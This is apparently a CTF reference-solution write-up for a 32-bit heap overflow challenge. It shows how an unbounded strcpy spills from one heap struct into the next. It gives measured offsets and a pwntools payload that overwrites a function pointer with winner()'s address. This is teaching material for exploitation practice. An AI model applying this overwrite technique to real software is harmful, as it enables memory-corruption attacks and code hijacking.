# Bonus: Cross Two Structs (heap-havoc)

**Tools:** GDB, objdump, pwntools, Docker

## Goal

Reference solution for heap-havoc.
The overflow leaves one heap object entirely and lands inside the *next struct*, several fields deep, on a function pointer nobody guards.
This binary is **32-bit**.

## Background

```c
struct internet {
        int priority;
        char *name;
        void (*callback)(void);
};
```

`main()` allocates two of these, each with an 8-byte `name` buffer, and copies `argv[1]`/`argv[2]` into the names with `strcpy()` — no bounds check.
It then calls each `callback` if it is non-NULL; both start NULL.
`winner()` prints the flag and is never called from the visible control flow.

## The bug

`i1`, `i1->name`, `i2`, and `i2->name` are allocated back-to-back in that order, so `i1->name`'s chunk is immediately followed by `i2`'s struct.
Overflowing `argv[1]` past `i1->name` reaches `i2->priority`, `i2->name`, and `i2->callback` in turn — 4 bytes each on this 32-bit build.

## The exploit

Measured in `gdb` (breakpoint after the four `malloc()`s, comparing `i2` against `i1->name`): `i2`'s struct starts exactly **16 bytes** after the start of `i1->name`'s buffer.
`argv[1]` is then:

```text
16 bytes filler           -- reaches the start of i2
 4 bytes filler           -- i2->priority, contents irrelevant
 4 bytes writable address -- i2->name (must stay valid: main() runs
                             strcpy(i2->name, argv[2]) after the overflow)
 4 bytes winner()'s addr  -- i2->callback
```

```python
payload = b"A"*16 + b"B"*4 + p32(BSS_ADDR) + p32(WINNER_ADDR)
```

For `i2->name` any always-mapped writable address works; the exploit reuses the binary's own `.bss` start (non-PIE, so fixed).
`argv[2]` just needs to be short — it is written harmlessly to that `.bss` address.
`WINNER_ADDR` and `.bss` are read from the ELF, so the exploit needs the binary present.

### Delivering argv over the network

A bare TCP socket carries no argv, so the deployed `wrapper.sh` reads two lines from the connection and re-execs the binary with them as `argv[1]`/`argv[2]`.
Locally the exploit uses `process([exe, arg1, arg2])`; remotely it sends the two lines.

See `solve/exploit.py`.

## Build, run and solve

Docker is the only requirement — including the 32-bit toolchain, which the build image supplies via `gcc-multilib` (no host-side 32-bit dev environment needed).
Four-stage pipeline — `build/` (32-bit, `-no-pie`) → `publish/` (ships the 32-bit `libc.so.6` and `ld-linux.so.2`) → `deploy/` (wrapper + `xinetd`, port `31020`) → `solve/`.
The `flag` here is copied into the container as `flag.txt` at deploy time.

## References

* `man 1 objdump`, `man 3 strcpy`
* [pwntools packing helpers](https://docs.pwntools.com/en/stable/util/packing.html)
* Original challenge: <https://learn.cylabacademy.org/library/763>
